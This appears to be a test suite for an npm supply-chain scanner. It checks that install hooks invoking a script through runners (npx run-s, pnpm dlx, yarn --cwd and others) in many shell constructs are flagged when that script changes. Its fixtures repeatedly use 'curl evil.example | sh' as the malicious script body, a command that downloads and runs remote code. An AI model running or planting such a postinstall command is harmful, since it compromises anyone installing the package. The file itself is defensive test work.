import { describe, expect, test } from "bun:test";
import { prepass, type FileMap } from "../src/prepass.ts";

const enc = (s: string) => new TextEncoder().encode(s);
const files = (o: Record<string, string>): FileMap => new Map(Object.entries(o).map(([k, v]) => [k, enc(v)]));
const holds = (old: FileMap, now: FileMap) => prepass("npm", old, now).hard.filter((s) => s.kind === "install-script").map((s) => s.detail);

// The install hook runs `evil` through a runner; only the text of the script `evil` changes between the two releases, so the
// change is seen only when the runner is followed to that script.
const pkg = (scripts: Record<string, string>) => files({ "package.json": JSON.stringify({ name: "p", version: "1.0.0", scripts }) });
const release = (evil: string, hook: string, other = "echo other") => pkg({ postinstall: hook, evil, quiet: "echo hi", other });
const bodyHeld = (hook: string) => holds(release("echo a", hook), release("curl evil.example | sh", hook)).length > 0;
const otherHeld = (hook: string) => holds(release("echo a", hook, "echo one"), release("echo a", hook, "curl evil.example | sh")).length > 0;

// Places where the shell still runs the form.
const PLACES: Record<string, (c: string) => string> = {
  plain: (c) => c,
  "after &&": (c) => `true && ${c}`,
  "after ||": (c) => `false || ${c}`,
  "after ;": (c) => `echo a; ${c}`,
  "if body": (c) => `if true; then ${c}; fi`,
  "if condition": (c) => `if ${c}; then :; fi`,
  "else body": (c) => `if false; then :; else ${c}; fi`,
  "elif body": (c) => `if false; then :; elif true; then ${c}; fi`,
  "f() body": (c) => `f() { ${c}; }; f`,
  "function body": (c) => `function f { ${c}; }; f`,
  "f() subshell body": (c) => `f() (${c}); f`,
  group: (c) => `{ ${c}; }`,
  subshell: (c) => `(${c})`,
  "while condition": (c) => `while ${c}; do break; done`,
  "until condition": (c) => `until ${c}; do :; done`,
  "for body": (c) => `for i in 1; do ${c}; done`,
  "case arm": (c) => `case x in x) ${c};; esac`,
  "negated": (c) => `! ${c}`,
  "if after &&": (c) => `true && if true; then ${c}; fi`,
  "f() body on its own lines": (c) => `f() {\n ${c}\n}\nf`,
};
const ALL = Object.keys(PLACES);
const COMPOUND = ALL.filter((p) => !["plain", "after &&", "after ||", "after ;", "case arm", "f() body on its own lines"].includes(p));

// Each group: the forms, and the places where main did not follow the form to the script (the rows of this change). The other
// places of the same forms already held on main: they are pins.
const groups: { name: string; forms: string[]; missed: string[] }[] = [
  {
    name: "npx running run-s, run-p or npm-run-all",
    forms: ["npx run-s evil", "npx --yes run-s evil", "npx npm-run-all evil", "npx run-p evil", "npx -y npm-run-all -s evil"],
    missed: ["if body", "if condition", "else body", "elif body", "function body", "group", "while condition", "until condition", "for body", "negated", "if after &&"],
  },
  {
    name: "bunx, pnpm dlx and exec, yarn and yarn exec running run-s",
    forms: ["bunx run-s evil", "pnpm dlx run-s evil", "pnpm exec run-s evil", "yarn run-s evil", "yarn exec run-s evil"],
    missed: ALL,
  },
  {
    name: "an npm-run-all mode flag before the name",
    forms: ["npm-run-all -p evil", "npm-run-all --parallel evil", "npm-run-all -s -c evil", "run-p --race evil", "run-s -l evil", "npm-run-all --serial -n evil"],
    missed: COMPOUND.concat("case arm"),
  },
  {
    name: "a directory flag naming this package (yarn --cwd ., pnpm -C ., bun --cwd .)",
    forms: ["yarn --cwd . evil", "yarn --cwd=. evil", "yarn --cwd ./ evil", "yarn --cwd . run evil", "pnpm -C . evil", "pnpm -C . run evil", "pnpm --dir . run evil", "pnpm --dir=./ evil", "bun --cwd . run evil", "bun --cwd=. run evil"],
    missed: COMPOUND.concat("case arm"),
  },
  {
    name: "run-s, run-p and npm-run-all in a function keyword body",
    forms: ["run-s evil", "npm-run-all evil", "run-p evil"],
    missed: ["function body"],
  },
];

describe("a runner form is followed to the script it names wherever the shell runs it", () => {
  for (const g of groups) {
    test(`${g.name}: held where main missed it`, () => {
      for (const c of g.forms) for (const p of g.missed) expect(bodyHeld(PLACES[p]!(c)), `${p}: ${c}`).toBe(true);
    });
    const pins = ALL.filter((p) => !g.missed.includes(p));
    if (pins.length > 0) {
      test(`${g.name}: pins, held on main too`, () => {
        for (const c of g.forms) for (const p of pins) expect(bodyHeld(PLACES[p]!(c)), `${p}: ${c}`).toBe(true);
      });
    }
  }
  test("pins: a function keyword body with () or on its own lines, held on main too", () => {
    for (const h of ["function f() { run-s evil; }; f", "function f {\n run-s evil\n}\nf"]) expect(bodyHeld(h), h).toBe(true);
  });
});

describe("what does not run this package's script stays out", () => {
  test("a change to another script is quiet for the same forms", () => {
    for (const c of ["npx run-s quiet", "pnpm dlx run-s quiet", "npm-run-all -p quiet", "yarn --cwd . quiet", "pnpm -C . quiet"]) {
      for (const p of ALL) expect(otherHeld(PLACES[p]!(c)), `${p}: ${c}`).toBe(false);
    }
  });

  test("yarn, pnpm and bun run a local script named run-s before the binary", () => {
    for (const bin of ["yarn", "pnpm", "bun"]) {
      const hook = `${bin} run-s evil`;
      const s = (evil: string) => pkg({ postinstall: hook, "run-s": "echo harmless", evil });
      expect(holds(s("echo a"), s("curl evil.example | sh")), hook).toEqual([]);
    }
  });

  test("run-s as an argument of another command is not a run", () => {
    for (const hook of ["echo run-s evil > log", "echo run-s evil | cat", "printf %s run-s evil > log"]) expect(bodyHeld(hook), hook).toBe(false);
  });

  test("a wrapped runner moved to another directory does not read this package's script", () => {
    for (const hook of ["npx yarn --cwd sub run-s evil", "npx pnpm --filter=sub exec run-s evil", "npx pnpm -r exec run-s evil", "npx yarn --cwd=sub run-s evil"]) {
      expect(bodyHeld(hook), hook).toBe(false);
    }
  });
});

test("a function keyword line keeps its own reading: it still widens when any file changes", () => {
  const hook = "function f { echo hi; }";
  const s = (v: string) => files({ "package.json": JSON.stringify({ name: "p", version: "1.0.0", scripts: { postinstall: hook } }), "a.js": v, "assets/x.bmp": v });
  const h = holds(s("1"), s("2")).join(" ");
  expect(h).toContain("a.js");
  expect(h).toContain("assets/x.bmp");
});

describe("review round two", () => {
  test("a cd inside a function body does not move the rest of the hook", () => {
    const hook = "function f { cd sub; }; sh x.sh";
    const s = (evil: string) =>
      files({ "package.json": JSON.stringify({ name: "p", version: "1.0.0", scripts: { postinstall: hook, evil } }), "x.sh": "npm run evil\n", "sub/x.sh": "echo hi\n" });
    expect(holds(s("echo a"), s("curl evil.example | sh")).length).toBeGreaterThan(0);
  });

  test("a local script named like a runner receives the words, it does not run them", () => {
    const hook = "pnpm bun run-s evil";
    const s = (evil: string) => pkg({ postinstall: hook, bun: "echo harmless", evil });
    expect(holds(s("echo a"), s("curl evil.example | sh"))).toEqual([]);
  });

  test("a local file named run-s is not npm-run-all", () => {
    for (const hook of ["pnpm exec ./tools/run-s evil", "yarn ./tools/run-s evil"]) {
      const s = (evil: string) =>
        files({ "package.json": JSON.stringify({ name: "p", version: "1.0.0", scripts: { postinstall: hook, evil } }), "tools/run-s": "#!/bin/sh\necho hi\n" });
      expect(holds(s("echo a"), s("curl evil.example | sh")), hook).toEqual([]);
    }
  });

  // On a plain line the hook text itself already names the script (as before); in an if body only the follow reads it.
  test("npx with a workspace flag runs in that workspace, so this package's script is not read", () => {
    for (const hook of ["npx --workspace sub run-s evil", "npx -w sub run-s evil"]) expect(bodyHeld(`if true; then ${hook}; fi`), hook).toBe(false);
  });

  // npm keeps the working directory for --prefix and -C but points npm_package_* at the prefix package;
  // which package the runner then reads is left unresolved here, so the follow stops (same as before).
  test("npx with a prefix flag stops the follow", () => {
    for (const hook of ["npx --prefix=sub run-s evil", "npx --prefix sub run-s evil", "npx -C sub run-s evil"]) expect(bodyHeld(`if true; then ${hook}; fi`), hook).toBe(false);
  });
});
